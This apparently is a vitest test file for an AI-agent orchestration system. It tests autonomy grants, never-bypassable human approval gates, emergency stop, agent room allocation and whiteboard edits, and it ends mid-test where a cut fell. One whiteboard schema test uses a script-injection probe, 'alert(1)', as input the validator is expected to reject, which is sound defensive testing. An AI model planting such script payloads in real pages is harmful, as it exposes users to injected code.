import { describe, expect, it } from "vitest";
import { defaultNodeBudget, usdToMicros } from "@contracts/dag";
import {
  AutonomyGrantSchema,
  GoalModePresetSchema,
  NEVER_BYPASSABLE_APPROVAL_KINDS,
  PERMANENT_OFFICE_WORKERS,
  WB_CONTENT_CAP,
  WB_NOTE_CAP,
  WbNodeSchema,
  WhiteboardOpSchema,
  type AutonomyGrant,
  type SetupStepKey,
  type WhiteboardOp,
} from "@contracts/office";
import {
  approvalBypassedEvent,
  budgetFitsGrant,
  budgetToGrantCeilings,
  grantBudgetExceededEvent,
  grantUsageExceeded,
  isGrantActive,
  nodeHasRiskSignals,
  planEmergencyStop,
  planGrantExpirations,
  planGrantRevocation,
  planGrantSupersede,
  resolveApprovalGate,
  validateGrantRequest,
} from "./autonomy";
import {
  DEFAULT_GOAL_MODE_PRESETS,
  applyGoalMode,
  goalModeMaxOutputTokens,
  resolveGoalModePresets,
} from "./goal-modes";
import {
  DEFAULT_ROOMS,
  deriveRoomHealth,
  deriveSetupChecklist,
  evaluateEligibility,
  permanentWorkerActionAllowed,
  permanentWorkerTargetAllowed,
  planAssignment,
  planReassignment,
  type OfficeAgent,
} from "./allocation";
import {
  applyWhiteboardOps,
  checkEditLease,
  detectWhiteboardDrift,
  exportWhiteboardJson,
  exportWhiteboardMarkdown,
  takeOverEditLease,
  type RefResolver,
  type WbBoard,
} from "./whiteboard";

const NOW = 1_800_000_000_000;

// ── Fixtures ─────────────────────────────────────────────────────

function makeGrant(over: Partial<AutonomyGrant> = {}): AutonomyGrant {
  return AutonomyGrantSchema.parse({
    id: 7,
    projectId: 42,
    scope: "project",
    runId: null,
    mode: "none",
    allowLive: false,
    maxTokens: 100_000,
    maxCalls: 20,
    maxMinutes: 60,
    maxCostUsdMicros: usdToMicros(2),
    grantedByName: "owner",
    reason: "",
    expiresAtMs: NOW + 60_000,
    revokedAtMs: null,
    revokedBy: null,
    revokeReason: null,
    ...over,
  });
}

const SAFE_NODE = {
  key: "brief",
  role: "Research Scientist",
  goal: "write a brief",
  toolsAllowed: ["read", "summarize"],
  outputArtifactType: "research-brief",
  budget: defaultNodeBudget(), // 24k tok / 6 calls / 15 min / $0.50
};

function makeAgent(over: Partial<OfficeAgent> = {}): OfficeAgent {
  return {
    workerId: 11,
    name: "kepler",
    kind: "subagent",
    role: "engineering-specialist",
    capabilities: ["read", "synthesize"],
    status: "active",
    maxConcurrentClaims: 2,
    activeClaims: 0,
    roomKey: null,
    version: 3,
    ...over,
  };
}

const ENGINEERING = DEFAULT_ROOMS.find((r) => r.key === "engineering")!;
const AI_RESEARCH = DEFAULT_ROOMS.find((r) => r.key === "ai-research")!;

function makeBoard(over: Partial<WbBoard> = {}): WbBoard {
  return {
    id: 5,
    projectId: 42,
    title: "Roadmap",
    revision: 1,
    version: 4,
    status: "active",
    nodes: [],
    edges: [],
    notes: [],
    editLease: { token: "tok-a", holder: "owner", expiresAtMs: NOW + 60_000 },
    ...over,
  };
}

// ── Autonomy: never-bypassable classes ───────────────────────────

describe("resolveApprovalGate — never-bypassable", () => {
  const grant = makeGrant({ mode: "none", allowLive: true });

  it.each(NEVER_BYPASSABLE_APPROVAL_KINDS)(
    "approval kind %s always requires a human, even under a 'none' live grant",
    (kind) => {
      expect(
        resolveApprovalGate({
          grant,
          run: { mode: "mock" },
          project: { riskTier: "low" },
          node: SAFE_NODE,
          approvalKind: kind,
        }),
      ).toBe("require");
    },
  );

  it("plan approval is a run-start gate no grant can waive", () => {
    expect(
      resolveApprovalGate({
        grant,
        run: { mode: "mock" },
        project: { riskTier: "low" },
        node: SAFE_NODE,
        approvalKind: "plan",
      }),
    ).toBe("require");
  });

  it.each([
    { externalAction: true },
    { codeExecution: { cmd: "ls" } },
    { credentials: { vault: "aws" } },
    { sourcePolicy: { promote: true } },
    { physicalAction: { robot: 1 } },
    { externalWrite: { target: "s3" } },
  ])("tripwire field %j forces require", (field) => {
    expect(nodeHasRiskSignals({ ...SAFE_NODE, ...field })).toBe(true);
    expect(
      resolveApprovalGate({
        grant,
        run: { mode: "mock" },
        project: { riskTier: "low" },
        node: { ...SAFE_NODE, ...field },
        approvalKind: "artifact-accept",
      }),
    ).toBe("require");
  });

  it("a tool verb outside the read-only ALLOWED_TOOL_VERBS forces require", () => {
    expect(
      nodeHasRiskSignals({ ...SAFE_NODE, toolsAllowed: ["read", "publish"] }),
    ).toBe(true);
    expect(
      resolveApprovalGate({
        grant,
        run: { mode: "mock" },
        project: { riskTier: "low" },
        node: { ...SAFE_NODE, toolsAllowed: ["exec"] },
        approvalKind: "artifact-accept",
      }),
    ).toBe("require");
  });
});

// ── Autonomy: mode semantics ─────────────────────────────────────

describe("resolveApprovalGate — modes", () => {
  it("no grant → require (mode 'all' is the default)", () => {
    expect(
      resolveApprovalGate({
        grant: null,
        run: { mode: "mock" },
        project: { riskTier: "low" },
        node: SAFE_NODE,
        approvalKind: "artifact-accept",
      }),
    ).toBe("require");
  });

  it("mode 'all' grant → require", () => {
    expect(
      resolveApprovalGate({
        grant: makeGrant({ mode: "all" }),
        run: { mode: "mock" },
        project: { riskTier: "low" },
        node: SAFE_NODE,
        approvalKind: "artifact-accept",
      }),
    ).toBe("require");
  });

  it("mode 'none' bypasses per-node gates for mock runs", () => {
    expect(
      resolveApprovalGate({
        grant: makeGrant({ mode: "none" }),
        run: { mode: "mock" },
        project: { riskTier: "medium" },
        node: SAFE_NODE,
        approvalKind: "artifact-accept",
      }),
    ).toBe("bypass");
  });

  it("mode 'none' bypasses low-risk live text inside grant budgets", () => {
    expect(
      resolveApprovalGate({
        grant: makeGrant({ mode: "none", allowLive: true }),
        run: { mode: "live" },
        project: { riskTier: "low" },
        node: SAFE_NODE,
        approvalKind: "artifact-accept",
      }),
    ).toBe("bypass");
  });

  it("mode 'none' live without allowLive → require", () => {
    expect(
      resolveApprovalGate({
        grant: makeGrant({ mode: "none", allowLive: false }),
        run: { mode: "live" },
        project: { riskTier: "low" },
        node: SAFE_NODE,
        approvalKind: "artifact-accept",
      }),
    ).toBe("require");
  });

  it("mode 'none' live on medium-risk project → require (low tier only)", () => {
    expect(
      resolveApprovalGate({
        grant: makeGrant({ mode: "none", allowLive: true }),
        run: { mode: "live" },
        project: { riskTier: "medium" },
        node: SAFE_NODE,
        approvalKind: "artifact-accept",
      }),
    ).toBe("require");
  });

  it("mode 'none' live with non-text output → require", () => {
    expect(
      resolveApprovalGate({
        grant: makeGrant({ mode: "none", allowLive: true }),
        run: { mode: "live" },
        project: { riskTier: "low" },
        node: { ...SAFE_NODE, outputArtifactType: "binary-export" },
        approvalKind: "artifact-accept",
      }),
    ).toBe("require");
  });

  it("mode 'none' live with node budget over grant ceilings → require", () => {
    const tight = makeGrant({
      mode: "none",
      allowLive: true,
      maxTokens: 1_000,
      maxCostUsdMicros: usdToMicros(0.01),
    });
    expect(budgetFitsGrant(SAFE_NODE.budget, tight)).toBe(false);
    expect(
      resolveApprovalGate({
        grant: tight,
        run: { mode: "live" },
        project: { riskTier: "low" },
        node: SAFE_NODE,
        approvalKind: "artifact-accept",
      }),
    ).toBe("require");
  });

  it("mode 'none' on a high-risk project → forbidden (may not be preauthorized)", () => {
    expect(
      resolveApprovalGate({
        grant: makeGrant({ mode: "none", allowLive: true }),
        run: { mode: "mock" },
        project: { riskTier: "high" },
        node: SAFE_NODE,
        approvalKind: "artifact-accept",
      }),
    ).toBe("forbidden");
  });

  it("risk_based bypasses low/medium-risk nodes within budget; live needs allowLive", () => {
    const grant = makeGrant({ mode: "risk_based", allowLive: true });
    expect(
      resolveApprovalGate({
        grant,
        run: { mode: "live" },
        project: { riskTier: "medium" },
        node: SAFE_NODE,
        approvalKind: "artifact-accept",
      }),
    ).toBe("bypass");
    expect(
      resolveApprovalGate({
        grant: makeGrant({ mode: "risk_based", allowLive: false }),
        run: { mode: "live" },
        project: { riskTier: "low" },
        node: SAFE_NODE,
        approvalKind: "artifact-accept",
      }),
    ).toBe("require");
    expect(
      resolveApprovalGate({
        grant,
        run: { mode: "live" },
        project: { riskTier: "high" },
        node: SAFE_NODE,
        approvalKind: "artifact-accept",
      }),
    ).toBe("require");
  });
});

// ── Autonomy: grant lifecycle ────────────────────────────────────

describe("grant lifecycle", () => {
  it("expired grant is inactive and degrades the next gate to require", () => {
    const expired = makeGrant({ expiresAtMs: NOW - 1 });
    expect(isGrantActive(expired, NOW)).toBe(false);
    expect(
      resolveApprovalGate({
        grant: null, // caller pre-filters expired grants
        run: { mode: "mock" },
        project: { riskTier: "low" },
        node: SAFE_NODE,
        approvalKind: "artifact-accept",
      }),
    ).toBe("require");
  });

  it("revoked grant resolves as require even if handed to the resolver", () => {
    const revoked = makeGrant({ revokedAtMs: NOW - 1, revokedBy: "owner" });
    expect(
      resolveApprovalGate({
        grant: revoked,
        run: { mode: "mock" },
        project: { riskTier: "low" },
        node: SAFE_NODE,
        approvalKind: "artifact-accept",
      }),
    ).toBe("require");
  });

  it("sweeper expiry plan emits one autonomy_expired event per newly expired grant", () => {
    const plan = planGrantExpirations(
      [
        makeGrant({ id: 1, expiresAtMs: NOW - 1 }),
        makeGrant({ id: 2, expiresAtMs: NOW + 60_000 }),
        makeGrant({ id: 3, expiresAtMs: NOW - 5, revokedAtMs: NOW - 10 }),
      ],
      NOW,
    );
    expect(plan.expiredGrantIds).toEqual([1]);
    expect(plan.events).toHaveLength(1);
    expect(plan.events[0].type).toBe("autonomy_expired");
  });

  it("double revoke is a race, not a silent success", () => {
    const first = planGrantRevocation({
      grant: makeGrant(),
      actorName: "owner",
      reason: "done",
      nowMs: NOW,
    });
    expect(first.ok).toBe(true);
    const second = planGrantRevocation({
      grant: makeGrant({ revokedAtMs: NOW, revokedBy: "owner" }),
      actorName: "owner",
      reason: "again",
      nowMs: NOW,
    });
    expect(second).toEqual({ ok: false, error: "already_revoked" });
  });

  it("grant supersede revokes only currently-active grants and audits", () => {
    const plan = planGrantSupersede({
      activeGrants: [
        makeGrant({ id: 1 }),
        makeGrant({ id: 2, revokedAtMs: NOW - 5 }),
      ],
      newGrantId: 3,
      mode: "none",
      actorName: "owner",
      nowMs: NOW,
    });
    expect(plan.supersededGrantIds).toEqual([1]);
    expect(plan.event.type).toBe("autonomy_granted");
    expect(plan.event.payload.superseded).toEqual([1]);
  });

  it("validateGrantRequest rejects 'none'+live on non-low-risk projects", () => {
    expect(
      validateGrantRequest({
        mode: "none",
        allowLive: true,
        riskTier: "medium",
        expiresInMinutes: 60,
        nowMs: NOW,
      }),
    ).toEqual({ ok: false, error: "live_requires_low_risk" });
    expect(
      validateGrantRequest({
        mode: "none",
        allowLive: true,
        riskTier: "low",
        expiresInMinutes: 60,
        nowMs: NOW,
      }).ok,
    ).toBe(true);
  });

  it("validateGrantRequest enforces the TTL window (5 min .. 7 days)", () => {
    expect(
      validateGrantRequest({
        mode: "risk_based",
        allowLive: false,
        riskTier: "low",
        expiresInMinutes: 2,
        nowMs: NOW,
      }),
    ).toEqual({ ok: false, error: "ttl_out_of_range" });
    expect(
      validateGrantRequest({
        mode: "risk_based",
        allowLive: false,
        riskTier: "low",
        expiresInMinutes: 20_000,
        nowMs: NOW,
      }),
    ).toEqual({ ok: false, error: "ttl_out_of_range" });
  });

  it("grant usage crossing any hard ceiling is a breach (tokens/calls/minutes/USD)", () => {
    const grant = makeGrant({
      maxTokens: 1_000,
      maxCalls: 2,
      maxMinutes: 5,
      maxCostUsdMicros: usdToMicros(0.5),
    });
    expect(
      grantUsageExceeded(grant, {
        tokens: 1_001,
        calls: 0,
        minutes: 0,
        costUsdMicros: 0,
      }),
    ).toEqual({ ceiling: "maxTokens", used: 1_001, limit: 1_000 });
    expect(
      grantUsageExceeded(grant, {
        tokens: 0,
        calls: 3,
        minutes: 0,
        costUsdMicros: 0,
      })?.ceiling,
    ).toBe("maxCalls");
    expect(
      grantUsageExceeded(grant, {
        tokens: 0,
        calls: 0,
        minutes: 6,
        costUsdMicros: 0,
      })?.ceiling,
    ).toBe("maxMinutes");
    expect(
      grantUsageExceeded(grant, {
        tokens: 0,
        calls: 0,
        minutes: 0,
        costUsdMicros: usdToMicros(0.51),
      })?.ceiling,
    ).toBe("maxCostUsdMicros");
    expect(
      grantUsageExceeded(grant, {
        tokens: 1_000,
        calls: 2,
        minutes: 5,
        costUsdMicros: usdToMicros(0.5),
      }),
    ).toBeNull();
    const evt = grantBudgetExceededEvent({
      grantId: grant.id,
      breach: { ceiling: "maxCalls", used: 3, limit: 2 },
    });
    expect(evt.type).toBe("grant_budget_exceeded");
    expect(evt.actor).toBe("system");
  });

  it("emergency stop revokes active grants, stops active runs, audits once", () => {
    const plan = planEmergencyStop({
      projectId: 42,
      activeGrants: [
        makeGrant({ id: 1 }),
        makeGrant({ id: 2, revokedAtMs: NOW - 5 }),
      ],
      activeRunIds: [101, 102],
      actorName: "owner",
      reason: "halt",
      nowMs: NOW,
    });
    expect(plan.revokeGrantIds).toEqual([1]);
    expect(plan.stopRunIds).toEqual([101, 102]);
    expect(plan.event.type).toBe("autonomy_revoked");
    expect(plan.event.payload).toMatchObject({
      emergency: true,
      stoppedRuns: [101, 102],
    });
  });

  it("every bypass leaves a per-node audit record", () => {
    const evt = approvalBypassedEvent({
      grantId: 7,
      mode: "none",
      nodeKey: "brief",
      kind: "artifact-accept",
    });
    expect(evt).toMatchObject({
      type: "approval_bypassed",
      actor: "system",
      payload: { grantId: 7, mode: "none", nodeKey: "brief" },
    });
  });

  it("budget input converts to integer-micro ceilings", () => {
    expect(
      budgetToGrantCeilings({
        maxTokens: 1000,
        maxCalls: 5,
        maxMinutes: 10,
        maxCostUsd: 1.5,
      }).maxCostUsdMicros,
    ).toBe(1_500_000);
  });
});

// ── Goal modes ───────────────────────────────────────────────────

describe("provider goal modes", () => {
  it("rejects any preset carrying a model key (no model-id smuggling)", () => {
    expect(() =>
      GoalModePresetSchema.parse({
        mode: "build",
        strategyId: "plan_execute",
        model: "gpt-5.2-codex",
      }),
    ).toThrow();
    expect(() =>
      GoalModePresetSchema.parse({
        mode: "build",
        strategyId: "plan_execute",
        model: "claude-opus-4-7",
        vendor: { supports: ["computer-use"] },
      }),
    ).toThrow();
  });

  it("rejects strategy ids outside the existing catalog", () => {
    expect(() =>
      GoalModePresetSchema.parse({ mode: "build", strategyId: "mega_think" }),
    ).toThrow();
  });

  it("shipped defaults use only existing strategy ids for all four modes", () => {
    for (const mode of ["explore", "build", "evaluate", "operate"] as const) {
      const preset = DEFAULT_GOAL_MODE_PRESETS[mode];
      expect(preset.mode).toBe(mode);
      expect(GoalModePresetSchema.parse(preset)).toEqual(preset);
    }
  });

  it("owner overrides merge per-mode; invalid entries fall back to defaults", () => {
    const resolved = resolveGoalModePresets({
      build: {
        mode: "build",
        strategyId: "direct_structured",
        preamble: "custom",
        outputTokenFraction: 0.25,
      },
      explore: { mode: "explore", strategyId: "not_a_strategy" },
      operate: { mode: "operate", strategyId: "direct_structured", model: "x" },
    });
    expect(resolved.build.preamble).toBe("custom");
    expect(resolved.build.outputTokenFraction).toBe(0.25);
    expect(resolved.explore).toEqual(DEFAULT_GOAL_MODE_PRESETS.explore);
    expect(resolved.operate).toEqual(DEFAULT_GOAL_MODE_PRESETS.operate);
  });

  it("injects a labeled trusted preamble section and scales output tokens", () => {
    const out = applyGoalMode({
      system: "BASE SYSTEM",
      nodeMaxTokens: 8_000,
      preset: DEFAULT_GOAL_MODE_PRESETS.operate,
    });
    expect(out.system).toContain(
      "--- GOAL MODE: operate (strategy direct_structured) ---",
    );
    expect(out.system.startsWith("BASE SYSTEM")).toBe(true);
    expect(out.maxOutputTokens).toBe(4_000); // 0.5 fraction
    expect(goalModeMaxOutputTokens(8_000, DEFAULT_GOAL_MODE_PRESETS.build)).toBe(
      8_000,
    );
    expect(
      goalModeMaxOutputTokens(1, {
        ...DEFAULT_GOAL_MODE_PRESETS.build,
        outputTokenFraction: 0.1,
      }),
    ).toBe(1); // never zero
  });
});

// ── Office allocation ────────────────────────────────────────────

describe("room allocation", () => {
  it("rejects at-capacity rooms (room_at_capacity)", () => {
    const verdict = evaluateEligibility({
      agent: makeAgent(),
      room: ENGINEERING,
      occupancy: ENGINEERING.capacity,
    });
    expect(verdict.ok).toBe(false);
    expect(verdict.reasons).toContain("room_at_capacity");
  });

  it("enforces role-pattern eligibility", () => {
    const analyst = makeAgent({ role: "research-analyst" });
    expect(
      evaluateEligibility({ agent: analyst, room: ENGINEERING, occupancy: 0 })
        .reasons,
    ).toContain("role_mismatch");
    expect(
      evaluateEligibility({ agent: analyst, room: AI_RESEARCH, occupancy: 0 }).ok,
    ).toBe(true);
  });

  it("rejects suspended agents, already-seated agents, and missing capabilities", () => {
    expect(
      evaluateEligibility({
        agent: makeAgent({ status: "suspended" }),
        room: ENGINEERING,
        occupancy: 0,
      }).reasons,
    ).toContain("agent_not_active");
    expect(
      evaluateEligibility({
        agent: makeAgent({ roomKey: "engineering" }),
        room: AI_RESEARCH,
        occupancy: 0,
      }).reasons,
    ).toContain("already_seated");
    expect(
      evaluateEligibility({
        agent: makeAgent({ capabilities: ["read"] }),
        room: ENGINEERING,
        occupancy: 0,
        capabilitiesRequired: ["synthesize"],
      }).reasons,
    ).toContain("missing_capability");
  });

  it("rejects when the room budget rollup exceeds any envelope (incl. storage)", () => {
    const usage = {
      tokens: 0,
      calls: 0,
      minutes: 0,
      costUsdMicros: 0,
      storageBytes: ENGINEERING.budgets.maxStorageBytes + 1,
    };
    expect(
      evaluateEligibility({
        agent: makeAgent(),
        room: ENGINEERING,
        occupancy: 0,
        usage,
      }).reasons,
    ).toContain("room_budget_exceeded");
  });

  it("planAssignment seats an eligible agent and audits; OCC mismatch conflicts", () => {
    const ok = planAssignment({
      agent: makeAgent(),
      room: ENGINEERING,
      occupancy: 1,
      expectedVersion: 3,
      runId: 101,
      nodeKey: "extract-forks",
    });
    expect(ok.ok).toBe(true);
    if (ok.ok) {
      expect(ok.plan.toRoomKey).toBe("engineering");
      expect(ok.plan.event.type).toBe("office_agent_assigned");
    }
    const stale = planAssignment({
      agent: makeAgent(),
      room: ENGINEERING,
      occupancy: 1,
      expectedVersion: 2,
    });
    expect(stale).toEqual({
      ok: false,
      error: { error: "version_conflict", currentVersion: 3 },
    });
  });

  it("reassignment: no claims moves atomically; claims require a policy", () => {
    const idle = planReassignment({
      agent: makeAgent({ roomKey: "engineering", role: "research-engineer" }),
      fromRoomKey: "engineering",
      toRoom: AI_RESEARCH,
      occupancy: 0,
      expectedVersion: 3,
    });
    expect(idle.ok && idle.plan.effect).toEqual({ kind: "move" });

    const holding = makeAgent({ roomKey: "engineering", activeClaims: 2 });
    const noPolicy = planReassignment({
      agent: holding,
      fromRoomKey: "engineering",
      toRoom: AI_RESEARCH,
      occupancy: 0,
      expectedVersion: 3,
    });
    expect(noPolicy).toEqual({
      ok: false,
      error: { error: "claims_policy_required", activeClaims: 2 },
    });
  });

  it("drain keeps claims and transfers on last completion; release requeues", () => {
    const holding = makeAgent({
      roomKey: "engineering",
      role: "research-engineer",
      activeClaims: 2,
    });
    const drain = planReassignment({
      agent: holding,
      fromRoomKey: "engineering",
      toRoom: AI_RESEARCH,
      occupancy: 0,
      expectedVersion: 3,
      claimsPolicy: "drain",
    });
    expect(drain.ok && drain.plan.effect).toEqual({
      kind: "drain",
      pendingTransfer: true,
    });
    const release = planReassignment({
      agent: holding,
      fromRoomKey: "engineering",
      toRoom: AI_RESEARCH,
      occupancy: 0,
      expectedVersion: 3,
      claimsPolicy: "release-requeue",
    });
    expect(release.ok && release.plan.effect).toEqual({
      kind: "release-requeue",
      releasedClaims: 2,
    });
  });

  it("reassign re-checks target capacity and role eligibility", () => {
    const holding = makeAgent({ roomKey: "engineering", activeClaims: 0 });
    const full = planReassignment({
      agent: holding,
      fromRoomKey: "engineering",
      toRoom: AI_RESEARCH,
      occupancy: AI_RESEARCH.capacity,
      expectedVersion: 3,
    });
    expect(full.ok).toBe(false);
    if (!full.ok && full.error.error === "conflict") {
      expect(full.error.reasons).toContain("room_at_capacity");
    } else {
      throw new Error("expected conflict");
    }
    const mismatched = planReassignment({
      agent: makeAgent({ roomKey: "engineering", role: "engineer" }),
      fromRoomKey: "engineering",
      toRoom: DEFAULT_ROOMS.find((r) => r.key === "security-trust")!,
      occupancy: 0,
      expectedVersion: 3,
    });
    expect(mismatched.ok).toBe(false);
  });

  it("health is deterministic: degraded beats strained, reasons are named", () => {
    const base = {
      occupancy: 3,
      capacity: 4,
      budgetUtilization: 0.4,
      storageUtilization: 0.4,
      anyWaitingOver10Min: false,
      staleLeaseNames: [] as string[],
      anyFailedAtMaxAttempts: false,
      providerMisconfigured: false,
      storageErrors: 0,
    };
    expect(deriveRoomHealth(base)).toEqual({ level: "healthy", reasons: [] });
    const strained = deriveRoomHealth({ ...base, budgetUtilization: 0.84 });
    expect(strained.level).toBe("strained");
    expect(strained.reasons).toEqual(["budget 84%"]);
    const degraded = deriveRoomHealth({
      ...base,
      budgetUtilization: 0.84,
      staleLeaseNames: ["ST-1"],
    });
    expect(degraded.level).toBe("degraded");
    expect(degraded.reasons).toEqual(["lease stale (ST-1)"]);
    expect(
      deriveRoomHealth({ ...base, occupancy: 5, capacity: 4 }).reasons,
    ).toEqual(["over capacity 5/4"]);
  });

  it("permanent roles are propose-only with a closed allow-list", () => {
    const ops = PERMANENT_OFFICE_WORKERS.blueprintOps.name;
    const carto = PERMANENT_OFFICE_WORKERS.roadmapCartographer.name;

    for (const action of [
      "stop-run",
      "start-run",
      "decide-approval",
      "suspend-worker",
      "delete-worker",
      "alter-budget",
      "mutate-run-node",
    ] as const) {
      expect(permanentWorkerActionAllowed(ops, action).allowed).toBe(false);
      expect(permanentWorkerActionAllowed(carto, action).allowed).toBe(false);
    }

    expect(permanentWorkerActionAllowed(ops, "propose-reassign").allowed).toBe(true);
    expect(permanentWorkerActionAllowed(ops, "sweep-leases").allowed).toBe(false);
    expect(
      permanentWorkerActionAllowed(ops, "sweep-leases", { autoSweepEnabled: true })
        .allowed,
    ).toBe(true);
    expect(
      permanentWorkerActionAllowed(carto, "sweep-leases", {
        autoSweepEnabled: true,
      }).allowed,
    ).toBe(false); // cartographer never sweeps
    expect(permanentWorkerActionAllowed(carto, "propose-plan-edit").allowed).toBe(true);
    expect(permanentWorkerActionAllowed(carto, "delete-history").allowed).toBe(false);
    expect(permanentWorkerActionAllowed(carto, "force-edit-lease").allowed).toBe(false);

    expect(permanentWorkerTargetAllowed("director")).toBe(false);
    expect(permanentWorkerTargetAllowed("human-delegate")).toBe(false);
    expect(permanentWorkerTargetAllowed("subagent")).toBe(true);
  });

  it("setup checklist completes only from observed state; skips never declare", () => {
    const observed = {
      agentsHired: 0,
      seatsFilled: 0,
      seatsTotal: 8,
      roomsWithAllocation: 0,
      roomsTotal: 8,
      anyTaskRunning: false,
    };
    const empty = deriveSetupChecklist(observed);
    expect(empty.complete).toBe(false);
    expect(empty.steps.every((s) => !s.complete)).toBe(true);

    const partial = deriveSetupChecklist(
      { ...observed, agentsHired: 6, seatsFilled: 6 },
      new Set<SetupStepKey>(["allocate-compute"]),
    );
    const populate = partial.steps.find((s) => s.key === "populate-rooms")!;
    expect(populate.complete).toBe(false);
    expect(populate.progress).toBe("6/8 seats filled");
    const compute = partial.steps.find((s) => s.key === "allocate-compute")!;
    expect(compute).toMatchObject({ complete: false, skipped: true });

    const done = deriveSetupChecklist({
      agentsHired: 6,
      seatsFilled: 8,
      seatsTotal: 8,
      roomsWithAllocation: 8,
      roomsTotal: 8,
      anyTaskRunning: true,
    });
    expect(done.complete).toBe(true);
    expect(done.steps.every((s) => s.complete)).toBe(true);
  });
});

// ── Whiteboard ───────────────────────────────────────────────────

describe("whiteboard domain ops", () => {
  const textNode = (nodeKey: string, content = "hello") => ({
    nodeKey,
    kind: "text" as const,
    content,
    position: { x: 0, y: 0 },
    refRunId: null,
    refNodeKey: null,
    refArtifactId: null,
  });

  it("OCC: stale expectedVersion conflicts with the current version", () => {
    const board = makeBoard();
    const res = applyWhiteboardOps({
      board,
      ops: [{ op: "addNode", node: textNode("n1") }],
      expectedVersion: 3,
      editToken: "tok-a",
      nowMs: NOW,
    });
    expect(res).toEqual({
      ok: false,
      error: { error: "version_conflict", currentVersion: 4 },
    });
  });

  it("OCC race: two batches at the same version — one wins, one conflicts", () => {
    const board = makeBoard();
    const first = applyWhiteboardOps({
      board,
      ops: [{ op: "addNode", node: textNode("n1") }],
      expectedVersion: 4,
      editToken: "tok-a",
      nowMs: NOW,
    });
    expect(first.ok).toBe(true);
    if (!first.ok) return;
    expect(first.board.version).toBe(5);
    expect(first.board.revision).toBe(2);
    expect(first.snapshot.revision).toBe(2);
    expect(first.snapshot.doc.nodes).toHaveLength(1);
    // Loser replays against the winner's board with the stale version.
    const second = applyWhiteboardOps({
      board: first.board,
      ops: [{ op: "addNode", node: textNode("n2") }],
      expectedVersion: 4,
      editToken: "tok-a",
      nowMs: NOW,
    });
    expect(second.ok).toBe(false);
    if (!second.ok && second.error.error === "version_conflict") {
      expect(second.error.currentVersion).toBe(5);
    } else {
      throw new Error("expected version_conflict");
    }
  });

  it("edit lease: missing token, foreign holder, and fenced stale holder", () => {
    expect(checkEditLease(makeBoard({ editLease: null }), null, NOW)).toEqual({
      ok: false,
      error: "lease_required",
    });
    const locked = checkEditLease(makeBoard(), "tok-b", NOW);
    expect(locked).toMatchObject({ ok: false, error: "locked", holder: "owner" });
    // Take over force-expires; the stale holder's next save is fenced.
    const taken = takeOverEditLease(makeBoard(), {
      token: "tok-b",
      holder: "owner-tab-2",
      expiresAtMs: NOW + 120_000,
    });
    expect(
      applyWhiteboardOps({
        board: taken,
        ops: [{ op: "addNode", node: textNode("n1") }],
        expectedVersion: 4,
        editToken: "tok-a",
        nowMs: NOW,
      }).ok,
    ).toBe(false);
    // Expired lease with the stale token → fenced.
    expect(
      checkEditLease(
        makeBoard({
          editLease: { token: "tok-a", holder: "owner", expiresAtMs: NOW - 1 },
        }),
        "tok-a",
        NOW,
      ),
    ).toMatchObject({ ok: false, error: "fenced" });
  });

  it("duplicate node keys conflict; unknown targets are bad_request", () => {
    const board = makeBoard({ nodes: [textNode("n1")] });
    const dup = applyWhiteboardOps({
      board,
      ops: [{ op: "addNode", node: textNode("n1") }],
      expectedVersion: 4,
      editToken: "tok-a",
      nowMs: NOW,
    });
    expect(dup.ok).toBe(false);
    if (!dup.ok) expect(dup.error.error).toBe("conflict");

    const missing = applyWhiteboardOps({
      board,
      ops: [{ op: "removeNode", nodeKey: "ghost" }],
      expectedVersion: 4,
      editToken: "tok-a",
      nowMs: NOW,
    });
    expect(missing.ok).toBe(false);
    if (!missing.ok) expect(missing.error.error).toBe("bad_request");
  });

  it("edges must land on existing nodes (validated against the end state)", () => {
    const board = makeBoard({ nodes: [textNode("n1")] });
    const res = applyWhiteboardOps({
      board,
      ops: [
        {
          op: "addEdge",
          edge: { edgeKey: "e1", fromKey: "n1", toKey: "ghost", kind: "link" },
        },
      ],
      expectedVersion: 4,
      editToken: "tok-a",
      nowMs: NOW,
    });
    expect(res.ok).toBe(false);
    if (!res.ok) expect(res.error.error).toBe("bad_request");
  });

  it("reference integrity: cross-project refs forbidden, missing refs bad_request", () => {
    const runNodeRef = (refRunId: number) => ({
      ...textNode("task-1", ""),
      kind: "run-node-ref" as const,
      refRunId,
      refNodeKey: "extract-forks",
    });
    const crossProject: RefResolver = () => ({ exists: true, projectId: 99 });
    const missing: RefResolver = () => ({ exists: false, projectId: null });
    const own: RefResolver = () => ({ exists: true, projectId: 42 });

    const forbidden = applyWhiteboardOps({
      board: makeBoard(),
      ops: [{ op: "addNode", node: runNodeRef(101) }],
      expectedVersion: 4,
      editToken: "tok-a",
      nowMs: NOW,
      resolveRef: crossProject,
    });
    expect(forbidden.ok).toBe(false);
    if (!forbidden.ok) expect(forbidden.error.error).toBe("forbidden");

    const bad = applyWhiteboardOps({
      board: makeBoard(),
      ops: [{ op: "addNode", node: runNodeRef(101) }],
      expectedVersion: 4,
      editToken: "tok-a",
      nowMs: NOW,
      resolveRef: missing,
    });
    expect(bad.ok).toBe(false);
    if (!bad.ok) expect(bad.error.error).toBe("bad_request");

    const ok = applyWhiteboardOps({
      board: makeBoard(),
      ops: [{ op: "addNode", node: runNodeRef(101) }],
      expectedVersion: 4,
      editToken: "tok-a",
      nowMs: NOW,
      resolveRef: own,
    });
    expect(ok.ok).toBe(true);
  });

  it("drift: missing refs and unreferenced live run nodes, sorted", () => {
    const board = {
      nodes: [
        {
          ...textNode("task-1", ""),
          kind: "run-node-ref" as const,
          refRunId: 101,
          refNodeKey: "extract-forks",
        },
        {
          ...textNode("ev-1", ""),
          kind: "artifact-ref" as const,
          refArtifactId: 555,
        },
      ],
    };
    const drift = detectWhiteboardDrift(board, {
      runNodeIds: new Set(["101:extract-forks", "101:taxonomy-build"]),
      artifactIds: new Set([111]),
    });
    expect(drift.map((d) => d.kind)).toEqual([
      "artifact-ref-missing",
      "unreferenced-run-node",
    ]);
    expect(drift[0].nodeKey).toBe("ev-1");
    expect(drift[1].message).toContain("101:taxonomy-build");
  });

  it("closed kinds: script/html-ish kinds and over-cap content are rejected", () => {
    expect(() =>
      WbNodeSchema.parse({
        nodeKey: "x",
        kind: "script",
        content: "alert(1)",
        position: { x: 0, y: 0 },
      }),
    ).toThrow();
    expect(() =>
      WhiteboardOpSchema.parse({
        op: "addNode",
        node: {
          nodeKey: "x",
          kind: "text",
          content: "y".repeat(WB_CONTENT_CAP + 1),
          position: { x: 0, y: 0 },
        },
      }),
    ).toThrow();
    expect(() =>
      WhiteboardOpSchema.parse({
        op: "addNote",
        note: {
          nodeKey: null,
          body: "y".repeat(WB_NOTE_CAP + 1),
          author: "human",
